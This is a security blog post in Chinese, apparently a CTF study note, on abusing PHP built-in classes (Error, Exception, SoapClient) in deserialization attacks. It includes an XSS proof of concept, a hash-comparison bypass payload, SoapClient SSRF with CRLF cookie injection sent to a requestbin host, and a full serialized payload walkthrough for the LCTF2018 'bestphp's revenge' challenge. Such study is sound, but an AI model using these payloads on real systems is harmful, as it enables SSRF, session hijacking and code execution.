<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0 user-scalable=1" name="viewport">
    <title>s4mmy&#39;s blog</title> <!--ä½¿ç”¨configä¸­çš„å…¨å±€å˜é‡titleä½œä¸ºæ ‡é¢˜-->
    
    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="s4mmy's blog" type="application/atom+xml">
</head>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
    
    <body>
        <header class="header">
    <div class="title">
        <a href="/" class="logo" >s4mmy&#39;s blog</a>
    </div>
    <nav class="navbar">
        <ul class="menu">
            
                <a href="/" class="menu-item-link">Home</a>   
            
                <a href="/journals/" class="menu-item-link">Journals</a>   
            
                <a href="/technical/" class="menu-item-link">Technical</a>   
            
                <a href="/other/" class="menu-item-link">Other</a>   
            
                <a href="/about/" class="menu-item-link">About</a>   
            
        </ul>
    
    </nav>
    
    
</header>



        
        <div class="container">
            <div style="border-bottom:1px solid #eaedf3;"></div>
            
            <article class="post-content">

<script>hljs.highlightAll();</script>    
<div class="post-title">
        <h2>PHPåŸç”Ÿç±»ç›¸å…³åˆ©ç”¨å­¦ä¹ </h2>
    </div>
    <div>
        <span class="post-time">2023-07-25</span>
    </div>
    <div class="post-font">
        <meta name="referrer" content="no-referrer" />

<h2 id="PHPåŸç”Ÿç±»ç›¸å…³åˆ©ç”¨"><a href="#PHPåŸç”Ÿç±»ç›¸å…³åˆ©ç”¨" class="headerlink" title="PHPåŸç”Ÿç±»ç›¸å…³åˆ©ç”¨"></a>PHPåŸç”Ÿç±»ç›¸å…³åˆ©ç”¨</h2><p>ç¬¬ä¸€æ¬¡å¬åˆ°åŸç”Ÿç±»æ˜¯å¬ä¸€ä¸ªå¸ˆå‚…è¯´çš„ï¼Œæ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±åœ¨åšé¢˜çš„æ—¶å€™é‡åˆ°äº†ã€‚</p>
<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>PHPåŸç”Ÿç±»æ˜¯PHPçš„ä¸€äº›å†…ç½®çš„ç±»ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ã€‚å› ä¸ºå…¶åŒ…å«ä¸€äº›é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™åˆ©ç”¨ã€‚æœ‰æ—¶å€™ï¼Œåœ¨é¢˜ç›®ä¸­å‡ºç°äº†ååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æœ‰ç»™å‡ºå…·ä½“ç±»ï¼Œä¸€èˆ¬ä¸æ˜¯æºç æ³„éœ²å†å®¡è®¡ï¼Œå°±æ˜¯åˆ©ç”¨phpçš„åŸç”Ÿç±»ã€‚</p>
<p>å¸¸ç”¨çš„åŸç”Ÿç±»æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p>
<ul>
<li>Error</li>
<li>Exception</li>
<li>SoapClient</li>
<li>DirectoryIterator</li>
<li>SimpleXMLElement</li>
</ul>
<p>éå†PHPå†…ç½®ç±»çš„æ–¹æ³•</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
$classes &#x3D; get_declared_classes();
foreach ($classes as $class) &#123;
    $methods &#x3D; get_class_methods($class);
    foreach ($methods as $method) &#123;
        if (in_array($method, array(
            &#39;__destruct&#39;,
            &#39;__toString&#39;,
            &#39;__wakeup&#39;,
            &#39;__call&#39;,
            &#39;__callStatic&#39;,
            &#39;__get&#39;,
            &#39;__set&#39;,
            &#39;__isset&#39;,
            &#39;__unset&#39;,
            &#39;__invoke&#39;,
            &#39;__set_state&#39;    &#x2F;&#x2F; å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»
        ))) &#123;
            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
        &#125;
    &#125;
&#125; 
</code></pre>





<h3 id="Errorå†…ç½®ç±»è¿›è¡Œ"><a href="#Errorå†…ç½®ç±»è¿›è¡Œ" class="headerlink" title="Errorå†…ç½®ç±»è¿›è¡Œ"></a>Errorå†…ç½®ç±»è¿›è¡Œ</h3><p>é€‚ç”¨æ¡ä»¶ï¼š</p>
<ul>
<li>é€‚ç”¨äºPHP7ç‰ˆæœ¬</li>
<li>å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>Erroræ˜¯php7çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œç”¨äºè‡ªåŠ¨è‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œåœ¨php7çš„ç¯å¢ƒä¸‹å¯èƒ½ä¼šé€ æˆä¸€ä¸ªxssæ¼æ´ï¼Œå› ä¸ºå®ƒå†…ç½®æœ‰ä¸€ä¸ª <code>__toString()</code> çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°†å¼‚å¸¸æˆ–è€…é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>å¸¸ç”¨äºPHP ååºåˆ—åŒ–ä¸­ã€‚å¦‚æœæœ‰ä¸ªPOPé“¾èµ°åˆ°ä¸€åŠå°±èµ°ä¸é€šäº†ï¼Œä¸å¦‚å°è¯•åˆ©ç”¨è¿™ä¸ªæ¥åšä¸€ä¸ªxssï¼Œå…¶å®æˆ‘çœ‹åˆ°çš„è¿˜æ˜¯æœ‰å¥½ä¸€äº›cmsä¼šé€‰æ‹©ç›´æ¥ä½¿ç”¨ <code>echo &lt;Object&gt;</code> çš„å†™æ³•ï¼Œå½“ PHP å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºæˆ–ä½¿ç”¨æ—¶å€™ï¼ˆå¦‚<code>echo</code>çš„æ—¶å€™ï¼‰ä¼šè§¦å‘<code>__toString</code> æ–¹æ³•ï¼Œè¿™æ˜¯ä¸€ç§æŒ–æ´çš„æ–°æ€è·¯ã€‚</p>
<p><strong>ç±»å±æ€§ï¼ˆå‚æ•°ï¼‰ï¼š</strong></p>
<ul>
<li>messageï¼šé”™è¯¯æ¶ˆæ¯å†…å®¹</li>
<li>codeï¼šé”™è¯¯ä»£ç </li>
<li>fileï¼šæŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</li>
<li>lineï¼šæŠ›å‡ºé”™è¯¯åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œæ•°</li>
</ul>
<p><strong>ç±»æ–¹æ³•ï¼š</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> â€” åˆå§‹åŒ– error å¯¹è±¡</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> â€” è·å–é”™è¯¯ä¿¡æ¯</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> â€” è¿”å›å…ˆå‰çš„ Throwable</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> â€” è·å–é”™è¯¯ä»£ç </li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„æ–‡ä»¶</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> â€” è·å–é”™è¯¯å‘ç”Ÿæ—¶çš„è¡Œå·</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> â€” å…‹éš† error</li>
</ul>
<p>è§¦å‘XSSç¤ºä¾‹</p>
<p>æµ‹è¯•ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$a &#x3D; unserialize($_GET[&#39;whoami&#39;]);
echo $a;
?&gt;</code></pre>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæµ‹è¯•ä»£ç çš„ç‰¹ç‚¹æ˜¯æœ‰ååºåˆ—åŒ–å…¥å£ä½†æ˜¯æ²¡ç»™ååºåˆ—åŒ–çš„ç±»</p>
<p>POCå¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$a&#x3D;new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;);
$b&#x3D;serialize($a);
echo urlencode($b);</code></pre>



<p>åˆ©ç”¨Erroré”™è¯¯è¾“å‡ºçš„ç‰¹ç‚¹ï¼Œåœ¨åšé¢˜ä¸­å¯ä»¥ç”¨æ¥ç»•è¿‡å¦‚md5ï¼Œsha1ç­‰çš„æ¯”è¾ƒ</p>
<p>ä¾‹é¢˜</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;
          if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;
              eval($this-&gt;syc);
          &#125; else &#123;
              die(&quot;Try Hard !!&quot;);
          &#125;</code></pre>

<p>è¿™æ®µä»£ç å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯ä½¿ç”¨æ•°ç»„æ— æ³•è¿›è¡Œåç»­çš„RCE</p>
<p>æµ‹è¯•ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 $a &#x3D; new Error(&#39;this is a test&#39;,1);
 echo $a;</code></pre>

<p>è¾“å‡ºç»“æœ</p>
<pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2
Stack trace:
#0 &#123;main&#125;</code></pre>

<p>å¯ä»¥å‘ç°åªè¾“å‡ºäº†å¼‚å¸¸ä¼‘æ¯å†…å®¹å’Œå¡åœ¨è¡Œæ•°ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºå¼‚å¸¸ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 $a &#x3D; new Error(&#39;this is a test&#39;,1);$b &#x3D; new Error(&#39;this is a test&#39;,2)
 echo $a.PHP_EOL;
 echo $b;</code></pre>

<p>è¾“å‡ºç»“æœ</p>
<pre class="line-numbers language-none"><code class="language-none">Error: this is a test in &#x2F;box&#x2F;script.php:2
Stack trace:
#0 &#123;main&#125;
Error: this is a test in &#x2F;box&#x2F;script.php:2
Stack trace:
#0 &#123;main&#125;
</code></pre>

<p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªçš„è¾“å‡ºæ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯è¾“å…¥å´ä¸åŒï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥ç»•è¿‡åˆ¤æ–­</p>
<p>payload</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;&#x2F;&#x2F;urlå–åç»•è¿‡å†’å·è¿‡æ»¤
$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);</code></pre>



<h3 id="Exception-å†…ç½®ç±»"><a href="#Exception-å†…ç½®ç±»" class="headerlink" title="Exception å†…ç½®ç±»"></a>Exception å†…ç½®ç±»</h3><p>Exceptionå†…ç½®ç±»å’ŒErrorå†…ç½®ç±»ç”¨æ³•åŸºæœ¬ç›¸åŒï¼ŒåŒºåˆ«åœ¨äºExceptionå†…ç½®ç±»é€‚ç”¨äºphp5&#x2F;7ç‰ˆæœ¬ã€‚</p>
<p><strong>ç±»å±æ€§ï¼š</strong></p>
<ul>
<li>messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹</li>
<li>codeï¼šå¼‚å¸¸ä»£ç </li>
<li>fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</li>
<li>lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·</li>
</ul>
<p><strong>ç±»æ–¹æ³•ï¼š</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> â€” å¼‚å¸¸æ„é€ å‡½æ•°</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> â€” è·å–å¼‚å¸¸ä»£ç </li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§°</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> â€” å¼‚å¸¸å…‹éš†</li>
</ul>
<h3 id="SoapClient-ç±»"><a href="#SoapClient-ç±»" class="headerlink" title="SoapClient ç±»"></a>SoapClient ç±»</h3><p>SoapClientç±»æ˜¯PHPå†…ç½®ç±»ä¸­ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®webæœåŠ¡çš„PHPå®¢æˆ·ç«¯ã€‚åœ¨åšé¢˜æ—¶å¯ç”¨äºSSRF</p>
<p>ç±»æ–¹æ³•å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">SoapClient &#123;
    &#x2F;* æ–¹æ³• *&#x2F;
    public __construct ( string|null $wsdl , array $options &#x3D; [] )
    public __call ( string $name , array $args ) : mixed
    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay &#x3D; false ) : string|null
    public __getCookies ( ) : array
    public __getFunctions ( ) : array|null
    public __getLastRequest ( ) : string|null
    public __getLastRequestHeaders ( ) : string|null
    public __getLastResponse ( ) : string|null
    public __getLastResponseHeaders ( ) : string|null
    public __getTypes ( ) : array|null
    public __setCookie ( string $name , string|null $value &#x3D; null ) : void
    public __setLocation ( string $location &#x3D; &quot;&quot; ) : string|null
    public __setSoapHeaders ( SoapHeader|array|null $headers &#x3D; null ) : bool
    public __soapCall ( string $name , array $args , array|null $options &#x3D; null , SoapHeader|array|null $inputHeaders &#x3D; null , array &amp;$outputHeaders &#x3D; null ) : mixed
&#125;</code></pre>

<p>å†…ç½®ç±»ä¸­æœ‰ä¸€ä¸ª<code>__call</code>æ–¹æ³•ï¼Œ<code>__call</code>æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ï¼Œæ­£æ˜¯è¿™æ ·å®ƒå¯ä»¥è¢«åˆ©ç”¨åˆ°SSRFä¸­ã€‚</p>
<p>æ„é€ å‡½æ•°å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])</code></pre>

<ul>
<li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li>
<li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li>
</ul>
<p>åˆ©ç”¨SoapClientè¿›è¡ŒSSRFç¤ºä¾‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#x2F;XXX&#39;,&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;IP_ADDR:PORT&#39;));
$b&#x3D;serialize($a);
echo $b;
$c&#x3D;unserialize($b);
$c-&gt;a(); &#x2F;&#x2F;è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•è§¦å‘__call()è¿›è¡ŒSSRF</code></pre>

<p>ä½†æ˜¯ï¼Œç”±äºå®ƒä»…é™äºHTTP&#x2F;HTTPSåè®®ï¼Œæ‰€ä»¥ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚è€Œå¦‚æœè¿™é‡ŒHTTPå¤´éƒ¨è¿˜å­˜åœ¨CRLFæ¼æ´çš„è¯ï¼Œä½†æˆ‘ä»¬åˆ™å¯ä»¥é€šè¿‡SSRF+CRLFï¼Œæ’å…¥ä»»æ„çš„HTTPå¤´ã€‚</p>
<p>æ’å…¥cookieç¤ºä¾‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
$target &#x3D; &#39;http:&#x2F;&#x2F;requestbin.net&#x2F;r&#x2F;doe3ps5d&#39;;
$a &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target, &#39;user_agent&#39; &#x3D;&gt; &quot;WHOAMI\r\nCookie: PHPSESSID&#x3D;tcjr6nadpk3md7jbgioa6elfk4&quot;, &#39;uri&#39; &#x3D;&gt; &#39;test&#39;));
$b &#x3D; serialize($a);
echo $b;
$c &#x3D; unserialize($b);
$c-&gt;a();    &#x2F;&#x2F; éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf
?&gt;</code></pre>



<p>ä¾‹é¢˜</p>
<p><strong>bestphpâ€™s revenge</strong></p>
<p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
$b &#x3D; &#39;implode&#39;;
call_user_func($_GET[&#39;f&#39;], $_POST);
session_start();
if (isset($_GET[&#39;name&#39;])) &#123;
    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
&#125;
var_dump($_SESSION);
$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
call_user_func($b, $a);
?&gt; array(0) &#123; &#125;</code></pre>

<p>ä½¿ç”¨dirsearchå¯æ‰«å‡ºflag.php</p>
<p>å†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">only localhost can get flag!session_start();
echo &#39;only localhost can get flag!&#39;; 
$flag &#x3D; &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]&#x3D;&#x3D;&#x3D;&quot;127.0.0.1&quot;)
&#123; $_SESSION[&#39;flag&#39;] &#x3D; $flag; &#125; 
only localhost can get flag!</code></pre>

<p>ç”±<code>$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;</code>å¯ä»¥æ¨æµ‹è¿™é‡Œéœ€è¦é€šè¿‡å†…ç½‘è¿›è¡Œè®¿é—®ã€‚ç”±æ­¤å¯ä»¥æ¨æ–­å‡ºè¿™é‡Œéœ€è¦ä½¿ç”¨SSRFã€‚</p>
<p>åè§‚æºç ï¼Œæœ‰ä¸¤ä¸ª<code>call_user_func</code>å¯ä»¥ä½¿ç”¨å¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°ã€‚è¿™é‡Œèƒ½æƒ³åˆ°çš„å°±æ˜¯ä½¿ç”¨SoapClientç±»è¿›è¡ŒSSRFã€‚ä½†æ˜¯è¦ä½¿ç”¨SoapClientè¿›è¡ŒSSRFçš„è¯éœ€è¦ååºåˆ—åŒ–è§¦å‘SoapClientç±»é‡Œçš„<code>__call()</code>é­”æ³•å‡½æ•°ã€‚</p>
<p> é—®é¢˜æ˜¯é¢˜ç›®é‡Œå¹¶æ²¡æœ‰ç›´æ¥ç»™å‡ºååºåˆ—åŒ–æ¥å£ï¼Œä½†æ˜¯ç”±é¢˜ç›®é‡Œçš„<code>session_start()</code>å¯ä»¥è”æƒ³åˆ°è¿™é‡Œè¦åˆ©ç”¨<code>session()</code>è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<p>å…ˆåˆ©ç”¨é¢˜ç›®ä¸­çš„</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_GET[&#39;name&#39;])) &#123;
    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
&#125;</code></pre>

<p>å†™å…¥åºåˆ—åŒ–æ•°æ®ï¼Œå†æ ¹æ®æ­¤å¤„</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">var_dump($_SESSION);
$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
call_user_func($b, $a);</code></pre>

<p>åˆ©ç”¨<code>call_user_func</code>çš„ç‰¹æ€§å¯ä»¥è°ƒç”¨ä¸å­˜åœ¨çš„å‡½æ•°è§¦å‘SSRFä»è€Œå°†flagå†™å…¥sessionä¸­ã€‚æœ€åé€šè¿‡<code>var_dump($_SESSION);</code>è¾“å‡ºflagã€‚</p>
<p>è¿™é‡Œç¬¬ä¸€æ­¥è¦å…ˆè®¾ç½®phpçš„sessionåºåˆ—åŒ–å¼•æ“</p>
<blockquote>
<p>ä½†æ˜¯å¦‚æœæƒ³è¦åˆ©ç”¨sessionååºåˆ—åŒ–æ¼æ´çš„è¯ï¼Œæˆ‘ä»¬å¿…é¡»è¦æœ‰ <code>ini_set()</code> è¿™ä¸ªå‡½æ•°æ¥æ›´æ”¹ <code>session.serialize_handler</code> çš„å€¼ï¼Œå°†sessionååºåˆ—åŒ–å¼•æ“ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œæœ¬æ¥åº”è¯¥ä½¿ç”¨ini_set()è¿™ä¸ªå‡½æ•°çš„ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¸æ¥å—æ•°ç»„ï¼Œæ‰€ä»¥å°±ä¸è¡Œäº†ã€‚äºæ˜¯æˆ‘ä»¬å°±ç”¨<code>session_start()</code>å‡½æ•°æ¥ä»£æ›¿ï¼Œå³æ„é€  session_start(serialize_handler&#x3D;php_serialize) å°±è¡Œäº†ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨é¢˜ç›®ä¸­çš„ <code>call_user_func($_GET[â€˜fâ€™], $_POST);</code> å‡½æ•°ï¼Œä¼ å…¥<code>GETï¼š/?f=session_start</code>ã€POSTï¼š<code>serialize_handler=php_serialize</code>ï¼Œå®ç° session_start(serialize_handler&#x3D;php_serialize) çš„è°ƒç”¨æ¥ä¿®æ”¹æ­¤é¡µé¢çš„åºåˆ—åŒ–å¼•æ“ä¸ºphp_serializeã€‚</p>
</blockquote>
<p>å…ˆæŠŠsessionä¸­çš„PHPSESSIDè®°å½•ä¸‹æ¥</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049498.png" alt="image-20230719150003390"></p>
<pre class="line-numbers language-module__htmlArea" data-language="module__htmlArea"><code class="language-module__htmlArea">n4caglsikk9fufk06mefhv4gv6</code></pre>

<p>ä¿®æ”¹ååºåˆ—åŒ–å¼•æ“ï¼ŒæŠŠéœ€è¦ååºåˆ—åŒ–çš„æ•°æ®å†™å…¥session</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?php
$a &#x3D; new SoapClient(null,array(&#39;location&#39;&#x3D;&gt;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;,&#39;user_agent&#39;&#x3D;&gt;&quot;s4mmy\r\nCookie: PHPSESSID&#x3D;n4caglsikk9fufk06mefhv4gv6\r\n&quot;,&#39;uri&#39;&#x3D;&gt;&quot;123&quot;));
$b&#x3D;urlencode(serialize($a));
echo &#39;|&#39;.$b;</code></pre>

<p>è¿™é‡Œæˆ‘è¸©çš„äº†ä¸ªå°å‘ï¼Œåƒ<code>\r\n</code>è¿™ç§è½¬ä¹‰å­—ç¬¦åœ¨PHPä¸­è¦æ”¾åœ¨åŒå¼•å·ä¸­æ‰èƒ½ç”Ÿæ•ˆï¼Œæˆ‘ä¹‹å‰å†™çš„æ—¶å€™æ”¾åœ¨å•å¼•å·å†…æ— æ³•ç”Ÿæ•ˆã€‚ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A53%3A%22s4mmy%0D%0ACookie%3A+PHPSESSID%3Dn4caglsikk9fufk06mefhv4gv6%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>

<p>ï¼ˆä¸è¦å¿˜è®°åºåˆ—åŒ–æ•°æ®åŒºå‰é¢çš„ç«–æ ï¼‰</p>
<p><img src="https://gitee.com/shark-rice/images/raw/master/202307250049671.png" alt="image-20230719150147210"></p>
<p>æ¥ç€åªè¦åˆ·æ–°é¡µé¢å°±èƒ½ååºåˆ—åŒ–æ•°æ®ã€‚ä½†æ˜¯è¿˜éœ€ä»¥ä¸€æ­¥æ˜¯è§¦å‘<code>__call</code>æ–¹æ³•ã€‚è¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>call_user_func</code>çš„ä¸€ä¸ªç‰¹æ€§ã€‚å½“ä¼ å…¥<code>call_user_func</code>çš„å‚æ•°æ˜¯ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œå¯ä»¥ç”¨<code>call_user_func()</code>æ¥è°ƒç”¨ä¸€ä¸ªç±»é‡Œé¢çš„æ–¹æ³•ï¼Œcall_user_func()ä¼šå°†è¿™ä¸ªæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå€¼å½“åšç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“åšæ–¹æ³•åï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨<code>welcome_to_the_lctf2018</code>è¿™ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•å®Œæˆååºåˆ—åŒ–ã€‚è‡³äº<code>$b</code>å°±æ˜¯ç”¨<code>extarct</code>å‡½æ•°è¿›è¡Œå˜é‡è¦†ç›–ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">?f&#x3D;extract

POST
b&#x3D;call_user_func</code></pre>

